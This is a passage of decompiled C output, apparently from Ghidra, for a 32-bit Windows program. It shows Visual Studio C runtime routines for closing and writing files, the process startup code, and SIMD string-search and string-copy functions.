    if (_DstSize != 0xffffffff) {
      FUN_00409600((uint *)_DstBuf,0,_DstSize);
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
  }
  return 0;
}



void FUN_00406122(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



// Library Function - Single Match
//  __fclose_nolock
// 
// Library: Visual Studio 2012 Release

int __cdecl __fclose_nolock(FILE *_File)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  
  iVar4 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
    iVar4 = -1;
  }
  else {
    if ((*(byte *)&_File->_flag & 0x83) != 0) {
      iVar4 = __flush(_File);
      __freebuf(_File);
      uVar2 = __fileno(_File);
      iVar3 = FUN_00409f27(uVar2);
      if (iVar3 < 0) {
        iVar4 = -1;
      }
      else if (_File->_tmpfname != (char *)0x0) {
        FID_conflict__free(_File->_tmpfname);
        _File->_tmpfname = (char *)0x0;
      }
    }
    _File->_flag = 0;
  }
  return iVar4;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fclose
// 
// Library: Visual Studio 2012 Release

int __cdecl _fclose(FILE *_File)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
  }
  else if ((*(byte *)&_File->_flag & 0x40) == 0) {
    __lock_file(_File);
    iVar2 = __fclose_nolock(_File);
    FUN_00406205();
  }
  else {
    _File->_flag = 0;
  }
  return iVar2;
}



void FUN_00406205(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



// Library Function - Single Match
//  __fwrite_nolock
// 
// Library: Visual Studio 2012 Release

size_t __cdecl __fwrite_nolock(void *_DstBuf,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  WCHAR *pWVar2;
  int iVar3;
  WCHAR *pWVar4;
  WCHAR *pWVar5;
  WCHAR *pWVar6;
  uint uVar7;
  WCHAR *pWVar8;
  WCHAR *pWVar9;
  WCHAR *local_8;
  
  if ((_Size != 0) && (_Count != 0)) {
    if ((_File != (FILE *)0x0) &&
       ((_DstBuf != (void *)0x0 && (_Count <= (uint)(0xffffffff / (ulonglong)_Size))))) {
      pWVar9 = (WCHAR *)(_Size * _Count);
      pWVar8 = pWVar9;
      if ((_File->_flag & 0x10cU) == 0) {
        local_8 = (WCHAR *)0x1000;
      }
      else {
        local_8 = (WCHAR *)_File->_bufsiz;
      }
      do {
        while( true ) {
          if (pWVar8 == (WCHAR *)0x0) {
            return _Count;
          }
          uVar7 = _File->_flag & 0x108;
          if (uVar7 != 0) break;
LAB_004062b8:
          if (local_8 <= pWVar8) {
            if ((uVar7 != 0) && (iVar3 = __flush(_File), iVar3 != 0)) goto LAB_00406356;
            pWVar4 = pWVar8;
            if (local_8 != (WCHAR *)0x0) {
              pWVar4 = (WCHAR *)((int)pWVar8 - (uint)pWVar8 % (uint)local_8);
            }
            pWVar2 = (WCHAR *)_DstBuf;
            pWVar6 = pWVar4;
            pWVar5 = (WCHAR *)__fileno(_File);
            pWVar6 = (WCHAR *)FUN_0040a8a4(pWVar5,pWVar2,pWVar6);
            if (pWVar6 != (WCHAR *)0xffffffff) {
              pWVar2 = pWVar4;
              if (pWVar6 <= pWVar4) {
                pWVar2 = pWVar6;
              }
              pWVar8 = (WCHAR *)((int)pWVar8 - (int)pWVar2);
              if (pWVar4 <= pWVar6) goto LAB_00406315;
            }
            goto LAB_00406352;
          }
                    // WARNING: Load size is inaccurate
          uVar7 = FUN_00407dae(*_DstBuf,_File);
          if (uVar7 == 0xffffffff) goto LAB_00406356;
          _DstBuf = (void *)((int)_DstBuf + 1);
          local_8 = (WCHAR *)_File->_bufsiz;
          pWVar8 = (WCHAR *)((int)pWVar8 - 1);
          if ((int)local_8 < 1) {
            local_8 = (WCHAR *)0x1;
          }
        }
        pWVar2 = (WCHAR *)_File->_cnt;
        if (pWVar2 == (WCHAR *)0x0) goto LAB_004062b8;
        if ((int)pWVar2 < 0) {
LAB_00406352:
          _File->_flag = _File->_flag | 0x20;
LAB_00406356:
          return (uint)((int)pWVar9 - (int)pWVar8) / _Size;
        }
        if (pWVar8 < pWVar2) {
          pWVar2 = pWVar8;
        }
        FID_conflict__memcpy(_File->_ptr,_DstBuf,(size_t)pWVar2);
        _File->_cnt = _File->_cnt - (int)pWVar2;
        _File->_ptr = _File->_ptr + (int)pWVar2;
        pWVar8 = (WCHAR *)((int)pWVar8 - (int)pWVar2);
LAB_00406315:
        _DstBuf = (void *)((int)_DstBuf + (int)pWVar2);
      } while( true );
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fwrite
// 
// Library: Visual Studio 2012 Release

size_t __cdecl _fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_Size != 0) && (_Count != 0)) {
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      sVar2 = __fwrite_nolock(_Str,_Size,_Count,_File);
      FUN_004063da();
      return sVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
  }
  return 0;
}



void FUN_004063da(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x0040640c)
// WARNING: Removing unreachable block (ram,0x004064ee)

int FUN_004063e2(void)

{
  bool bVar1;
  undefined3 extraout_var;
  int iVar2;
  
  ___crtGetShowWindowMode();
  FUN_0040c1f6(2);
  bVar1 = FUN_0040bc18();
  if (CONCAT31(extraout_var,bVar1) == 0) {
    _fast_error_exit(0x1c);
  }
  iVar2 = __mtinit();
  if (iVar2 == 0) {
    _fast_error_exit(0x10);
  }
  FUN_0040c2dd();
  iVar2 = FUN_0040bc2d();
  if (iVar2 < 0) {
    _fast_error_exit(0x1b);
  }
  DAT_0041e018 = GetCommandLineW();
  DAT_0041b244 = ___crtGetEnvironmentStringsW();
  iVar2 = __wsetargv();
  if (iVar2 < 0) {
    __amsg_exit(8);
  }
  iVar2 = __wsetenvp();
  if (iVar2 < 0) {
    __amsg_exit(9);
  }
  iVar2 = __cinit(1);
  if (iVar2 != 0) {
    __amsg_exit(iVar2);
  }
  __wwincmdln();
  iVar2 = FUN_004018e6((HINSTANCE)&IMAGE_DOS_HEADER_00400000);
                    // WARNING: Subroutine does not return
  _exit(iVar2);
}



// Library Function - Single Match
//  _fast_error_exit
// 
// Library: Visual Studio 2012 Release

void __cdecl _fast_error_exit(int param_1)

{
  if (DAT_0041bbcc == 1) {
    __FF_MSGBANNER();
  }
  __NMSG_WRITE(param_1);
  ___crtExitProcess(0xff);
  return;
}



void entry(void)

{
  ___security_init_cookie();
  FUN_004063e2();
  return;
}



// Library Function - Single Match
//  _wcsrchr
// 
// Library: Visual Studio 2012 Release

wchar_t * __cdecl _wcsrchr(wchar_t *_Str,wchar_t _Ch)

{
  undefined *puVar1;
  undefined (*pauVar2) [16];
  int iVar3;
  undefined (*pauVar4) [16];
  bool bVar5;
  bool bVar6;
  
  pauVar4 = (undefined (*) [16])0x0;
  pauVar2 = (undefined (*) [16])_Str;
  if (DAT_0041bbd0 < 2) {
    do {
      puVar1 = *pauVar2;
      pauVar4 = (undefined (*) [16])(*pauVar2 + 2);
      pauVar2 = pauVar4;
    } while (*(short *)puVar1 != 0);
    do {
      pauVar4 = (undefined (*) [16])(pauVar4[-1] + 0xe);
      if (pauVar4 == (undefined (*) [16])_Str) break;
    } while (*(wchar_t *)*pauVar4 != _Ch);
    if (*(wchar_t *)*pauVar4 != _Ch) {
      pauVar4 = (undefined (*) [16])0x0;
    }
  }
  else {
    for (; ((uint)((undefined *)_Str + 1) & 0xe) != 0; _Str = (wchar_t *)((undefined *)_Str + 2)) {
      if (*(wchar_t *)(undefined *)_Str == _Ch) {
        pauVar4 = (undefined (*) [16])_Str;
      }
      if (*(wchar_t *)(undefined *)_Str == L'\0') {
        return (wchar_t *)pauVar4;
      }
    }
    bVar5 = _Ch != L'\0';
    bVar6 = _Ch == L'\0';
    if (bVar6) {
      while (iVar3 = pcmpistri(ZEXT416(0xffff0001),*(undefined (*) [16])_Str,0x15), !bVar6) {
        _Str = (wchar_t *)((int)_Str + 0x10);
        bVar6 = (undefined (*) [16])_Str == (undefined (*) [16])0x0;
      }
      pauVar4 = (undefined (*) [16])((undefined *)_Str + iVar3 * 2);
    }
    else {
      while( true ) {
        iVar3 = pcmpistri(ZEXT216((ushort)_Ch),*(undefined (*) [16])_Str,0x41);
        if (bVar5) {
          pauVar4 = (undefined (*) [16])((undefined *)_Str + iVar3 * 2);
        }
        if (bVar6) break;
        bVar5 = (undefined (*) [16])0xffffffef < _Str;
        _Str = (wchar_t *)((int)_Str + 0x10);
        bVar6 = (undefined (*) [16])_Str == (undefined (*) [16])0x0;
      }
    }
  }
  return (wchar_t *)pauVar4;
}



// Library Function - Single Match
//  _wcsstr
// 
// Library: Visual Studio 2012 Release

wchar_t * __cdecl _wcsstr(wchar_t *_Str,wchar_t *_SubStr)

{
  ushort uVar1;
  uint uVar2;
  int iVar3;
  undefined (*pauVar4) [16];
  undefined (*pauVar5) [16];
  wchar_t *pwVar6;
  wchar_t *pwVar7;
  undefined auVar8 [16];
  undefined auVar9 [16];
  undefined auVar10 [16];
  undefined auVar11 [16];
  undefined auVar12 [16];
  undefined auVar13 [16];
  wchar_t wVar14;
  wchar_t wVar15;
  int local_14;
  
  wVar14 = *_SubStr;
  if (wVar14 != L'\0') {
    if (1 < DAT_0041bbd0) {
      if (((uint)_SubStr & 0xfff) < 0xff1) {
        auVar8 = *(undefined (*) [16])_SubStr;
      }
      else {
        iVar3 = 8;
        pwVar6 = _SubStr;
        auVar9 = (undefined  [16])0x0;
        wVar15 = wVar14;
        do {
          auVar8._0_8_ = auVar9._2_8_;
          auVar8._8_8_ = auVar9._8_8_ >> 0x10 | (ulonglong)(ushort)wVar15 << 0x30;
          if (wVar15 != L'\0') {
            pwVar6 = pwVar6 + 1;
            wVar15 = *pwVar6;
          }
          iVar3 = iVar3 + -1;
          auVar9 = auVar8;
        } while (iVar3 != 0);
      }
LAB_0040668c:
      while( true ) {
        while( true ) {
          uVar2 = (uint)_Str & 0xfff;
          pauVar4 = (undefined (*) [16])_SubStr;
          if (uVar2 < 0xff1) break;
          if (*(wchar_t *)(undefined *)_Str == L'\0') goto LAB_00406895;
          pauVar5 = (undefined (*) [16])_Str;
          if (*(wchar_t *)(undefined *)_Str == wVar14) goto LAB_004066c2;
          _Str = (wchar_t *)((undefined *)_Str + 2);
        }
        pcmpistri(auVar8,*(undefined (*) [16])_Str,0xd);
        if (uVar2 < 0xff1) break;
        _Str = (wchar_t *)((int)_Str + 0x10);
      }
      if (uVar2 < 0xff0) {
        iVar3 = pcmpistri(auVar8,*(undefined (*) [16])_Str,0xd);
        _Str = (wchar_t *)((undefined *)_Str + iVar3 * 2);
        pauVar5 = (undefined (*) [16])_Str;
LAB_004066c2:
        do {
          for (; 0xff0 < ((uint)_Str & 0xfff); _Str = (wchar_t *)((undefined *)_Str + 2)) {
LAB_00406718:
            if (*(short *)*pauVar4 == 0) {
              return (wchar_t *)pauVar5;
            }
            if (*(short *)(undefined *)_Str != *(short *)*pauVar4) goto LAB_00406730;
            pauVar4 = (undefined (*) [16])(*pauVar4 + 2);
          }
          uVar2 = (uint)pauVar4 & 0xfff;
          if (0xff0 < uVar2) goto LAB_00406718;
          pcmpistri(*pauVar4,*(undefined (*) [16])_Str,0xd);
          if (!SBORROW4(uVar2,0xff0)) goto LAB_00406730;
          if ((int)(uVar2 - 0xff0) < 0) {
            return (wchar_t *)pauVar5;
          }
          _Str = (wchar_t *)((int)_Str + 0x10);
          pauVar4 = pauVar4 + 1;
        } while( true );
      }
      goto LAB_00406895;
    }
    if (DAT_0041bbd0 == 1) {
      auVar9 = pshuflw(ZEXT216((ushort)wVar14),ZEXT216((ushort)wVar14),0);
LAB_0040675f:
      for (; ((uint)_Str & 0xfff) < 0xff1; _Str = _Str + 8) {
        auVar10._0_2_ = -(ushort)(*_Str == L'\0');
        auVar10._2_2_ = -(ushort)(_Str[1] == L'\0');
        auVar10._4_2_ = -(ushort)(_Str[2] == L'\0');
        auVar10._6_2_ = -(ushort)(_Str[3] == L'\0');
        auVar10._8_2_ = -(ushort)(_Str[4] == L'\0');
        auVar10._10_2_ = -(ushort)(_Str[5] == L'\0');
        auVar10._12_2_ = -(ushort)(_Str[6] == L'\0');
        auVar10._14_2_ = -(ushort)(_Str[7] == L'\0');
        wVar14 = auVar9._0_2_;
        auVar12._0_2_ = -(ushort)(*_Str == wVar14);
        wVar15 = auVar9._2_2_;
        auVar12._2_2_ = -(ushort)(_Str[1] == wVar15);
        auVar12._4_2_ = -(ushort)(_Str[2] == wVar14);
        auVar12._6_2_ = -(ushort)(_Str[3] == wVar15);
        auVar12._8_2_ = -(ushort)(_Str[4] == wVar14);
        auVar12._10_2_ = -(ushort)(_Str[5] == wVar15);
        auVar12._12_2_ = -(ushort)(_Str[6] == wVar14);
        auVar12._14_2_ = -(ushort)(_Str[7] == wVar15);
        auVar10 = auVar10 | auVar12;
        uVar1 = (ushort)(SUB161(auVar10 >> 7,0) & 1) | (ushort)(SUB161(auVar10 >> 0xf,0) & 1) << 1 |
                (ushort)(SUB161(auVar10 >> 0x17,0) & 1) << 2 |
                (ushort)(SUB161(auVar10 >> 0x1f,0) & 1) << 3 |
                (ushort)(SUB161(auVar10 >> 0x27,0) & 1) << 4 |
                (ushort)(SUB161(auVar10 >> 0x2f,0) & 1) << 5 |
                (ushort)(SUB161(auVar10 >> 0x37,0) & 1) << 6 |
                (ushort)(SUB161(auVar10 >> 0x3f,0) & 1) << 7 |
                (ushort)(SUB161(auVar10 >> 0x47,0) & 1) << 8 |
                (ushort)(SUB161(auVar10 >> 0x4f,0) & 1) << 9 |
                (ushort)(SUB161(auVar10 >> 0x57,0) & 1) << 10 |
                (ushort)(SUB161(auVar10 >> 0x5f,0) & 1) << 0xb |
                (ushort)(SUB161(auVar10 >> 0x67,0) & 1) << 0xc |
                (ushort)(SUB161(auVar10 >> 0x6f,0) & 1) << 0xd |
                (ushort)(SUB161(auVar10 >> 0x77,0) & 1) << 0xe |
                (ushort)(byte)(auVar10[15] >> 7) << 0xf;
        if (uVar1 != 0) {
          uVar2 = 0;
          if (uVar1 != 0) {
            for (; (uVar1 >> uVar2 & 1) == 0; uVar2 = uVar2 + 1) {
            }
          }
          _Str = (wchar_t *)((int)_Str + (uVar2 & 0xfffffffe));
          break;
        }
      }
      if (*_Str != L'\0') {
        pwVar6 = _Str;
        pwVar7 = _SubStr;
        if (*_SubStr == *_Str) {
LAB_004067b1:
          for (; (((uint)pwVar7 & 0xfff) < 0xff1 && (((uint)pwVar6 & 0xfff) < 0xff1));
              pwVar6 = pwVar6 + 8) {
            auVar13._0_2_ = -(ushort)(*pwVar7 == L'\0');
            auVar13._2_2_ = -(ushort)(pwVar7[1] == L'\0');
            auVar13._4_2_ = -(ushort)(pwVar7[2] == L'\0');
            auVar13._6_2_ = -(ushort)(pwVar7[3] == L'\0');
            auVar13._8_2_ = -(ushort)(pwVar7[4] == L'\0');
            auVar13._10_2_ = -(ushort)(pwVar7[5] == L'\0');
            auVar13._12_2_ = -(ushort)(pwVar7[6] == L'\0');
            auVar13._14_2_ = -(ushort)(pwVar7[7] == L'\0');
            auVar11._0_2_ = -(ushort)(*pwVar6 != *pwVar7);
            auVar11._2_2_ = -(ushort)(pwVar6[1] != pwVar7[1]);
            auVar11._4_2_ = -(ushort)(pwVar6[2] != pwVar7[2]);
            auVar11._6_2_ = -(ushort)(pwVar6[3] != pwVar7[3]);
            auVar11._8_2_ = -(ushort)(pwVar6[4] != pwVar7[4]);
            auVar11._10_2_ = -(ushort)(pwVar6[5] != pwVar7[5]);
            auVar11._12_2_ = -(ushort)(pwVar6[6] != pwVar7[6]);
            auVar11._14_2_ = -(ushort)(pwVar6[7] != pwVar7[7]);
            auVar13 = auVar13 | auVar11;
            uVar1 = (ushort)(SUB161(auVar13 >> 7,0) & 1) |
                    (ushort)(SUB161(auVar13 >> 0xf,0) & 1) << 1 |
                    (ushort)(SUB161(auVar13 >> 0x17,0) & 1) << 2 |
                    (ushort)(SUB161(auVar13 >> 0x1f,0) & 1) << 3 |
                    (ushort)(SUB161(auVar13 >> 0x27,0) & 1) << 4 |
                    (ushort)(SUB161(auVar13 >> 0x2f,0) & 1) << 5 |
                    (ushort)(SUB161(auVar13 >> 0x37,0) & 1) << 6 |
                    (ushort)(SUB161(auVar13 >> 0x3f,0) & 1) << 7 |
                    (ushort)(SUB161(auVar13 >> 0x47,0) & 1) << 8 |
                    (ushort)(SUB161(auVar13 >> 0x4f,0) & 1) << 9 |
                    (ushort)(SUB161(auVar13 >> 0x57,0) & 1) << 10 |
                    (ushort)(SUB161(auVar13 >> 0x5f,0) & 1) << 0xb |
                    (ushort)(SUB161(auVar13 >> 0x67,0) & 1) << 0xc |
                    (ushort)(SUB161(auVar13 >> 0x6f,0) & 1) << 0xd |
                    (ushort)(SUB161(auVar13 >> 0x77,0) & 1) << 0xe |
                    (ushort)(byte)(auVar13[15] >> 7) << 0xf;
            if (uVar1 != 0) {
              uVar2 = 0;
              if (uVar1 != 0) {
                for (; (uVar1 >> uVar2 & 1) == 0; uVar2 = uVar2 + 1) {
                }
              }
              pwVar6 = (wchar_t *)((int)pwVar6 + (uVar2 & 0xfffffffe));
              pwVar7 = (wchar_t *)((int)pwVar7 + (uVar2 & 0xfffffffe));
              break;
            }
            pwVar7 = pwVar7 + 8;
          }
          if (*pwVar7 == L'\0') {
            return _Str;
          }
          if (*pwVar6 == *pwVar7) {
            pwVar6 = pwVar6 + 1;
            pwVar7 = pwVar7 + 1;
            goto LAB_004067b1;
          }
        }
        _Str = _Str + 1;
        goto LAB_0040675f;
      }
    }
    else if (*_Str != L'\0') {
      local_14 = (int)_Str - (int)_SubStr;
      pwVar6 = _SubStr;
      if (*_Str == L'\0') goto LAB_0040687a;
      do {
        do {
          if (*pwVar6 == L'\0') {
            return _Str;
          }
        } while ((*(wchar_t *)(local_14 + (int)pwVar6) == *pwVar6) &&
                (pwVar6 = pwVar6 + 1, *(short *)(local_14 + (int)pwVar6) != 0));
LAB_0040687a:
        if (*pwVar6 == L'\0') {
          return _Str;
        }
        _Str = _Str + 1;
        local_14 = local_14 + 2;
        pwVar6 = _SubStr;
      } while (*_Str != L'\0');
    }
LAB_00406895:
    _Str = (wchar_t *)0x0;
  }
  return _Str;
LAB_00406730:
  _Str = (wchar_t *)(*pauVar5 + 2);
  goto LAB_0040668c;
}



// Library Function - Single Match
//  _wcsncpy
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release, Visual Studio 2019 Release

wchar_t * __cdecl _wcsncpy(wchar_t *_Dest,wchar_t *_Source,size_t _Count)

{
  short sVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if (_Count != 0) {
    puVar4 = (undefined4 *)_Dest;
    do {
      sVar1 = *(short *)(((int)_Source - (int)_Dest) + (int)puVar4);
      *(short *)puVar4 = sVar1;
      puVar4 = (undefined4 *)((int)puVar4 + 2);
      if (sVar1 == 0) break;
      _Count = _Count - 1;
    } while (_Count != 0);
    if ((_Count != 0) && (uVar2 = _Count - 1, uVar2 != 0)) {
      for (uVar3 = uVar2 >> 1; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
      for (uVar2 = (uint)((uVar2 & 1) != 0); uVar2 != 0; uVar2 = uVar2 - 1) {
        *(undefined2 *)puVar4 = 0;
        puVar4 = (undefined4 *)((int)puVar4 + 2);
      }
    }
  }
  return _Dest;
}



// Library Function - Single Match
//  _strrchr
// 
// Libraries: Visual Studio 2012 Debug, Visual Studio 2015 Debug, Visual Studio 2017 Debug, Visual
// Studio 2019 Debug

undefined (*) [16] __cdecl _strrchr(undefined (*param_1) [16],byte param_2)

{
  byte bVar1;
  undefined *puVar2;
  uint uVar3;
  undefined (*pauVar4) [16];
  uint uVar5;
  int iVar6;
  undefined (*pauVar7) [16];
  char *pcVar8;
  byte *pbVar9;
  undefined auVar11 [16];
  undefined auVar12 [16];
  undefined auVar13 [16];
  undefined auVar14 [16];
  byte *pbVar10;
  
  if (DAT_0041bbd0 != 0) {
    if (DAT_0041bbd0 < 2) {
      auVar14 = pshuflw(ZEXT216(CONCAT11(param_2,param_2)),ZEXT216(CONCAT11(param_2,param_2)),0);
      uVar3 = -1 << (sbyte)((uint)param_1 & 0xf);
      pcVar8 = (char *)((int)param_1 - ((uint)param_1 & 0xf));
      pauVar7 = (undefined (*) [16])0x0;
      while( true ) {
        auVar13[0] = -(*pcVar8 == '\0');
        auVar13[1] = -(pcVar8[1] == '\0');
        auVar13[2] = -(pcVar8[2] == '\0');
        auVar13[3] = -(pcVar8[3] == '\0');
        auVar13[4] = -(pcVar8[4] == '\0');
        auVar13[5] = -(pcVar8[5] == '\0');
        auVar13[6] = -(pcVar8[6] == '\0');
        auVar13[7] = -(pcVar8[7] == '\0');
        auVar13[8] = -(pcVar8[8] == '\0');
        auVar13[9] = -(pcVar8[9] == '\0');
        auVar13[10] = -(pcVar8[10] == '\0');
        auVar13[11] = -(pcVar8[0xb] == '\0');
        auVar13[12] = -(pcVar8[0xc] == '\0');
        auVar13[13] = -(pcVar8[0xd] == '\0');
        auVar13[14] = -(pcVar8[0xe] == '\0');
        auVar13[15] = -(pcVar8[0xf] == '\0');
        auVar12[0] = -(*pcVar8 == auVar14[0]);
        auVar12[1] = -(pcVar8[1] == auVar14[1]);
        auVar12[2] = -(pcVar8[2] == auVar14[2]);
        auVar12[3] = -(pcVar8[3] == auVar14[3]);
        auVar12[4] = -(pcVar8[4] == auVar14[4]);
        auVar12[5] = -(pcVar8[5] == auVar14[5]);
        auVar12[6] = -(pcVar8[6] == auVar14[6]);
        auVar12[7] = -(pcVar8[7] == auVar14[7]);
        auVar12[8] = -(pcVar8[8] == auVar14[0]);
        auVar12[9] = -(pcVar8[9] == auVar14[1]);
        auVar12[10] = -(pcVar8[10] == auVar14[2]);
        auVar12[11] = -(pcVar8[0xb] == auVar14[3]);
        auVar12[12] = -(pcVar8[0xc] == auVar14[4]);
        auVar12[13] = -(pcVar8[0xd] == auVar14[5]);
        auVar12[14] = -(pcVar8[0xe] == auVar14[6]);
        auVar12[15] = -(pcVar8[0xf] == auVar14[7]);
        uVar5 = (ushort)((ushort)(SUB161(auVar13 >> 7,0) & 1) |
                         (ushort)(SUB161(auVar13 >> 0xf,0) & 1) << 1 |
                         (ushort)(SUB161(auVar13 >> 0x17,0) & 1) << 2 |
                         (ushort)(SUB161(auVar13 >> 0x1f,0) & 1) << 3 |
                         (ushort)(SUB161(auVar13 >> 0x27,0) & 1) << 4 |
                         (ushort)(SUB161(auVar13 >> 0x2f,0) & 1) << 5 |
                         (ushort)(SUB161(auVar13 >> 0x37,0) & 1) << 6 |
                         (ushort)(SUB161(auVar13 >> 0x3f,0) & 1) << 7 |
                         (ushort)(SUB161(auVar13 >> 0x47,0) & 1) << 8 |
                         (ushort)(SUB161(auVar13 >> 0x4f,0) & 1) << 9 |
                         (ushort)(SUB161(auVar13 >> 0x57,0) & 1) << 10 |
                         (ushort)(SUB161(auVar13 >> 0x5f,0) & 1) << 0xb |
                         (ushort)(SUB161(auVar13 >> 0x67,0) & 1) << 0xc |
                         (ushort)(SUB161(auVar13 >> 0x6f,0) & 1) << 0xd |
                         (ushort)(SUB161(auVar13 >> 0x77,0) & 1) << 0xe |
                        (ushort)(auVar13[15] >> 7) << 0xf) & uVar3;
        if (uVar5 != 0) break;
        uVar3 = (ushort)((ushort)(SUB161(auVar12 >> 7,0) & 1) |
                         (ushort)(SUB161(auVar12 >> 0xf,0) & 1) << 1 |
                         (ushort)(SUB161(auVar12 >> 0x17,0) & 1) << 2 |
                         (ushort)(SUB161(auVar12 >> 0x1f,0) & 1) << 3 |
                         (ushort)(SUB161(auVar12 >> 0x27,0) & 1) << 4 |
                         (ushort)(SUB161(auVar12 >> 0x2f,0) & 1) << 5 |
                         (ushort)(SUB161(auVar12 >> 0x37,0) & 1) << 6 |
                         (ushort)(SUB161(auVar12 >> 0x3f,0) & 1) << 7 |
                         (ushort)(SUB161(auVar12 >> 0x47,0) & 1) << 8 |
                         (ushort)(SUB161(auVar12 >> 0x4f,0) & 1) << 9 |
                         (ushort)(SUB161(auVar12 >> 0x57,0) & 1) << 10 |
                         (ushort)(SUB161(auVar12 >> 0x5f,0) & 1) << 0xb |
                         (ushort)(SUB161(auVar12 >> 0x67,0) & 1) << 0xc |
                         (ushort)(SUB161(auVar12 >> 0x6f,0) & 1) << 0xd |
                         (ushort)(SUB161(auVar12 >> 0x77,0) & 1) << 0xe |
                        (ushort)(auVar12[15] >> 7) << 0xf) & uVar3;
        iVar6 = 0x1f;
        if (uVar3 != 0) {
          for (; uVar3 >> iVar6 == 0; iVar6 = iVar6 + -1) {
          }
        }
        if (uVar3 != 0) {
          pauVar7 = (undefined (*) [16])(pcVar8 + iVar6);
        }
        uVar3 = 0xffffffff;
        pcVar8 = pcVar8 + 0x10;
      }
      uVar3 = (uVar5 * 2 & uVar5 * -2) - 1 &
              (ushort)((ushort)(SUB161(auVar12 >> 7,0) & 1) |
                       (ushort)(SUB161(auVar12 >> 0xf,0) & 1) << 1 |
                       (ushort)(SUB161(auVar12 >> 0x17,0) & 1) << 2 |
                       (ushort)(SUB161(auVar12 >> 0x1f,0) & 1) << 3 |
                       (ushort)(SUB161(auVar12 >> 0x27,0) & 1) << 4 |
                       (ushort)(SUB161(auVar12 >> 0x2f,0) & 1) << 5 |
                       (ushort)(SUB161(auVar12 >> 0x37,0) & 1) << 6 |
                       (ushort)(SUB161(auVar12 >> 0x3f,0) & 1) << 7 |
                       (ushort)(SUB161(auVar12 >> 0x47,0) & 1) << 8 |
                       (ushort)(SUB161(auVar12 >> 0x4f,0) & 1) << 9 |
                       (ushort)(SUB161(auVar12 >> 0x57,0) & 1) << 10 |
                       (ushort)(SUB161(auVar12 >> 0x5f,0) & 1) << 0xb |
                       (ushort)(SUB161(auVar12 >> 0x67,0) & 1) << 0xc |
                       (ushort)(SUB161(auVar12 >> 0x6f,0) & 1) << 0xd |
                       (ushort)(SUB161(auVar12 >> 0x77,0) & 1) << 0xe |
                      (ushort)(auVar12[15] >> 7) << 0xf) & uVar3;
      iVar6 = 0x1f;
      if (uVar3 != 0) {
        for (; uVar3 >> iVar6 == 0; iVar6 = iVar6 + -1) {
        }
      }
      pauVar4 = (undefined (*) [16])(pcVar8 + iVar6);
      if (uVar3 == 0) {
        pauVar4 = pauVar7;
      }
      return pauVar4;
    }
    uVar3 = (uint)param_2;
    if (uVar3 == 0) {
      pcVar8 = (char *)((uint)param_1 & 0xfffffff0);
      auVar14[0] = -(*pcVar8 == '\0');
      auVar14[1] = -(pcVar8[1] == '\0');
      auVar14[2] = -(pcVar8[2] == '\0');
      auVar14[3] = -(pcVar8[3] == '\0');
      auVar14[4] = -(pcVar8[4] == '\0');
      auVar14[5] = -(pcVar8[5] == '\0');
      auVar14[6] = -(pcVar8[6] == '\0');
      auVar14[7] = -(pcVar8[7] == '\0');
      auVar14[8] = -(pcVar8[8] == '\0');
      auVar14[9] = -(pcVar8[9] == '\0');
      auVar14[10] = -(pcVar8[10] == '\0');
      auVar14[11] = -(pcVar8[0xb] == '\0');
      auVar14[12] = -(pcVar8[0xc] == '\0');
      auVar14[13] = -(pcVar8[0xd] == '\0');
      auVar14[14] = -(pcVar8[0xe] == '\0');
      auVar14[15] = -(pcVar8[0xf] == '\0');
      uVar3 = (uint)(ushort)((ushort)(SUB161(auVar14 >> 7,0) & 1) |
                             (ushort)(SUB161(auVar14 >> 0xf,0) & 1) << 1 |
                             (ushort)(SUB161(auVar14 >> 0x17,0) & 1) << 2 |
                             (ushort)(SUB161(auVar14 >> 0x1f,0) & 1) << 3 |
                             (ushort)(SUB161(auVar14 >> 0x27,0) & 1) << 4 |
                             (ushort)(SUB161(auVar14 >> 0x2f,0) & 1) << 5 |
                             (ushort)(SUB161(auVar14 >> 0x37,0) & 1) << 6 |
                             (ushort)(SUB161(auVar14 >> 0x3f,0) & 1) << 7 |
                             (ushort)(SUB161(auVar14 >> 0x47,0) & 1) << 8 |
                             (ushort)(SUB161(auVar14 >> 0x4f,0) & 1) << 9 |
                             (ushort)(SUB161(auVar14 >> 0x57,0) & 1) << 10 |
                             (ushort)(SUB161(auVar14 >> 0x5f,0) & 1) << 0xb |
                             (ushort)(SUB161(auVar14 >> 0x67,0) & 1) << 0xc |
                             (ushort)(SUB161(auVar14 >> 0x6f,0) & 1) << 0xd |
                             (ushort)(SUB161(auVar14 >> 0x77,0) & 1) << 0xe |
                            (ushort)(auVar14[15] >> 7) << 0xf) & -1 << ((byte)param_1 & 0xf);
      while (uVar3 == 0) {
        auVar11[0] = -(pcVar8[0x10] == '\0');
        auVar11[1] = -(pcVar8[0x11] == '\0');
        auVar11[2] = -(pcVar8[0x12] == '\0');
        auVar11[3] = -(pcVar8[0x13] == '\0');
